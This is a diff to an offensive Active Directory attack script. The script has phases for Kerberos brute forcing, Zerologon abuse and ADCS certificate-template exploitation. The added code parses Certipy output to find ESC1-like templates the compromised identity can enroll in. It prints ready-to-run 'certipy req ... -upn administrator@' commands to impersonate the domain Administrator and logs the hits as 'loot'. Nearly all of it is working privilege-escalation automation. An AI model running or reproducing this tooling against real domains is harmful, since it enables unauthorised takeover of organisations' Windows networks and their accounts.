@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.31.1"
+readonly VERSION="1.32.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -1567,6 +1567,57 @@ phase_zerologon_abuse() {
 # ===========================================================================
 #  PHASE 7 — ADCS / CERTIPY  (vulnerable certificate templates)
 # ===========================================================================
+# Parse a full `certipy find -stdout` dump (on stdin) and report which ENABLED
+# templates the current identity (sAMAccountName + its group memberships) can
+# ENROLL in, with the ESC-relevant flags. Prints a line per enrollable template;
+# lines starting with ★ are ESC1-like (Enrollee-Supplies-Subject + ClientAuth +
+# no manager approval → request a cert for ANY user). Env: ADCS_PRINC, ADCS_GROUPS.
+_adcs_template_review() {
+    python3 - <<'PY'
+import sys, os, re
+txt = sys.stdin.read()
+princ = os.environ.get('ADCS_PRINC', '').strip().lower()
+groups = os.environ.get('ADCS_GROUPS', '')
+mine = {princ} if princ else set()
+for g in re.split(r'[,\|]', groups):
+    g = g.strip().lower()
+    if g:
+        mine.add(g)
+# buckets that almost always grant enrolment to a machine/low-priv principal
+mine |= {'domain computers', 'domain users', 'authenticated users', 'everyone',
+         'certificate service dcom access', 'users'}
+blocks = re.split(r'\n(?=\s{2,}\d+\s*\n)', txt)
+def field(b, key):
+    m = re.search(r'^\s*' + re.escape(key) + r'\s*:\s*(.+)$', b, re.M)
+    return m.group(1).strip() if m else ''
+def rights(b):
+    m = re.search(r'Enrollment Rights\s*:\s*(.+(?:\n\s{18,}\S.*)*)', b)
+    return [l.strip() for l in m.group(1).splitlines() if l.strip()] if m else []
+found = False
+for b in blocks:
+    name = field(b, 'Template Name')
+    if not name or field(b, 'Enabled').lower() != 'true':
+        continue
+    er = rights(b)
+    if not any(any(m in r.lower() for m in mine) for r in er):
+        continue
+    found = True
+    ess = field(b, 'Enrollee Supplies Subject').lower() == 'true'
+    ca  = field(b, 'Client Authentication').lower() == 'true'
+    appr = field(b, 'Requires Manager Approval').lower() == 'true'
+    tags = []
+    if ess: tags.append('ESS')
+    if ca:  tags.append('ClientAuth')
+    if appr: tags.append('ManagerApproval')
+    star = '★' if (ess and ca and not appr) else '-'
+    print(f"{star} {name}  [{', '.join(tags) or 'no notable flags'}]")
+    if star == '★':
+        print(f"    ESC1-like: certipy req -template '{name}' -upn administrator@<domain>  → impersonate Administrator")
+if not found:
+    print("(no enabled template enrollable by this identity or its groups)")
+PY
+}
+
 ADCS_PWNED=0       # set once an ESC yields Administrator → stop re-issuing certs
 phase_adcs() {
     [[ "$HAVE_AUTH" != "1" ]] && return
@@ -1612,7 +1663,17 @@ phase_adcs() {
         "${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${cbase[@]}" "${cauth[@]}" -output "$OUTDIR/certipy_$(_safe_name "$USER")" >/dev/null 2>&1
         _abuse_adcs "$cout" && ADCS_PWNED=1
     else
-        info "No templates ${USER} can abuse (enrolment rights gate ESC detection — a later identity may differ)"
+        info "Nothing flagged by -vulnerable — reviewing the FULL template list (enrolment by ${USER} + its groups)…"
+        subsection "Template review — what ${USER} can ENROLL in"
+        local full; full=$("${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${cbase[@]}" -stdout 2>&1)
+        echo "$full" >"$OUTDIR/certipy_templates_$(_safe_name "$USER").txt"
+        local rev; rev=$(ADCS_PRINC="${USER%\$}" ADCS_GROUPS="${OWNED_GROUPS[${USER,,}]:-}" _adcs_template_review <<<"$full")
+        printf '%s\n' "$rev" | while IFS= read -r l; do
+            [[ "$l" == ★* ]] && loot "  ${C_BOLD}$l${C_RESET}" || detail "      $l"
+        done
+        if grep -q '★' <<<"$rev"; then
+            loot "★ ESC1-like enrollable template above → certipy req -ca '$ca' -template <T> -upn administrator@$DOMAIN (SAN impersonation)"
+        fi
     fi
     # ESC15/EKUwu is the blind spot: certipy -vulnerable frequently does NOT flag it
     # even on a default v1 template (WebServer/SubCA) that ANY enrolment-capable user
